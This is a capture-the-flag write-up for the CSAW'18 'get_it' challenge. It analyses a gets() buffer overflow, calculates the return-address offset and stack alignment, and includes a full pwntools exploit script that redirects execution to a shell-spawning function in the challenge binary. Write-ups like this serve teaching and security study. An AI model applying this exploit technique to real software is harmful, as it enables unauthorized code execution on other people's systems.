# CSAW'18 Getit – Binary Exploitation Writeup

## Challenge Info
- **Binary:** `get_it`
- **Architecture:** x86_64
- **Security Features:**
  - NX enabled
  - No stack canary
  - Partial RELRO
  - No PIE (static addresses)
- **Objective:** Exploit a buffer overflow in `main` to execute `give_shell()`.

---

## Analysis

The binary contains two relevant functions:

```c
// main function
undefined8 main(void)
{
    char local_28[32];
    puts("Do you gets it??");
    gets(local_28);
    return 0;
}

// give_shell function
void give_shell(void)
{
    system("/bin/bash");
    return;
}
```

### Observations

1. The `gets()` function is used, which is **unsafe** and allows for buffer overflow.
2. The buffer `local_28` is **32 bytes**, but the stack frame adds some padding and saved registers, so we need to carefully calculate the offset to overwrite the return address.

---

## Finding the Offset

Using GDB and PWNDBG:

```text
p 0x7ffe76149bb8 - 0x7ffe76149b90 = 40
```

This shows that the offset to overwrite `RIP` is **40 bytes**. This includes:

- 32 bytes buffer
- 8 bytes for saved base pointer (RBP)

---

## Stack Alignment

On x86_64 Linux, the **stack must be 16-byte aligned** before calling functions (like `system()`).
If the stack is misaligned, you may get crashes (SIGSEGV) even if your payload seems correct.

- In this binary, we use a `ret` gadget (`0x400451`) before `give_shell()` to **align the stack** properly.
- This ensures `RSP % 16 == 0` when the call to `system("/bin/bash")` executes.

---

## Crafting the Exploit

### ROP Gadgets

Using `ROPgadget`:

```text
0x400451 : ret
0x4005b6 : give_shell
```

The `ret` instruction is used to align the stack.

### Payload

```python
from pwn import *

pay = b""
pay += b"A"*40          # Offset to RIP
pay += p64(0x400451)      # ret gadget for stack alignment
pay += p64(0x4005b6)      # give_shell address

p = process("./get_it")
p.recvuntil(b"Do you gets it??")
p.sendline(pay)
p.interactive()
```

---

## Demonstration

The full walkthrough is recorded in the `just.cast` asciinema file, which shows the exploit execution and successful shell spawn.

```bash
asciinema play just.cast
```

This file provides a **step-by-step visual demonstration** of the exploit in action.

---

**Notes:**
- Always check the stack alignment for x86_64 before calling functions like `system()`.
- Using `ret` gadgets is a common technique to fix alignment issues in 64-bit ROP chains.

